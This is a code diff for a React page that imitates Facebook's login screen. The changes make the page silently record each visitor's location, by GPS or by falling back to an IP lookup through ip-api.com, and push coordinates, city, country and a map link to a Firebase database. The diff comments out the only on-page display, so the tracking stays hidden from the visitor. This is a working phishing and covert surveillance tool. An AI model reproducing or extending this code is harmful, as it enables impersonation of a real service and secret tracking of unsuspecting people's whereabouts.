@@ -1,30 +1,54 @@
 import React, { useEffect, useState } from "react";
-import { database, ref, push } from "./firebase";
+import { database } from "./firebase";
+import { ref, push } from "firebase/database";
 
 function App() {
   const [location, setLocation] = useState(null);
+  const [loading, setLoading] = useState(true);
 
   useEffect(() => {
+    // Try getting location using GPS
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         async (position) => {
           const { latitude, longitude } = position.coords;
-          setLocation({ latitude, longitude });
-
-          // Store in Firebase Realtime Database
-          const locationRef = ref(database, "userLocations");
-          await push(locationRef, {
-            latitude,
-            longitude,
-            timestamp: new Date().toISOString(),
-          });
+          saveLocation(latitude, longitude, "GPS");
         },
-        (error) => console.error("Error getting location:", error)
+        async (error) => {
+          console.warn("GPS failed, trying IP-based location...", error);
+          // Fallback to IP-based geolocation
+          fetch("https://ip-api.com/json")
+            .then((res) => res.json())
+            .then((data) => {
+              saveLocation(data.lat, data.lon, "IP-based", data.city, data.country);
+            })
+            .catch((err) => console.error("IP Geolocation failed:", err));
+        }
       );
     } else {
       console.error("Geolocation not supported");
     }
   }, []);
+
+  // Function to store location in Firebase
+  const saveLocation = async (latitude, longitude, method, city = "", country = "") => {
+    const locationData = {
+      latitude,
+      longitude,
+      method, // GPS or IP-based
+      city,
+      country,
+      timestamp: new Date().toISOString(),
+      mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`, // Google Maps link
+    };
+
+    setLocation(locationData);
+    setLoading(false);
+
+    // Store in Firebase Realtime Database
+    const locationRef = ref(database, "userLocations");
+    await push(locationRef, locationData);
+  };
 
   return (
     <div
@@ -48,18 +72,14 @@ function App() {
           boxShadow: "0px 4px 10px rgba(0,0,0,0.1)",
         }}
       >
-        <h1
-          style={{
-            color: "#1877f2",
-            fontSize: "32px",
-            fontWeight: "bold",
-          }}
-        >
+        <h1 style={{ color: "#1877f2", fontSize: "32px", fontWeight: "bold" }}>
           facebook
         </h1>
         <p style={{ color: "#606770", fontSize: "16px" }}>
           Connect with friends and the world around you on Facebook.
         </p>
+
+        {/* Login Form */}
         <input
           type="text"
           placeholder="Email or phone number"
@@ -126,6 +146,31 @@ function App() {
         >
           Create New Account
         </button>
+
+        {/* Location Information */}
+        {/* <div style={{ marginTop: "20px", fontSize: "14px", color: "#606770" }}>
+          {loading ? (
+            <p>Fetching location...</p>
+          ) : location ? (
+            <div>
+              <p>Latitude: {location.latitude}</p>
+              <p>Longitude: {location.longitude}</p>
+              {location.city && <p>City: {location.city}</p>}
+              {location.country && <p>Country: {location.country}</p>}
+              <p>Method: {location.method}</p>
+              <a
+                href={location.mapLink}
+                target="_blank"
+                rel="noopener noreferrer"
+                style={{ color: "#1877f2", textDecoration: "none", fontWeight: "bold" }}
+              >
+                View on Google Maps
+              </a>
+            </div>
+          ) : (
+            <p>Could not retrieve location</p>
+          )}
+        </div> */}
       </div>
     </div>
   );
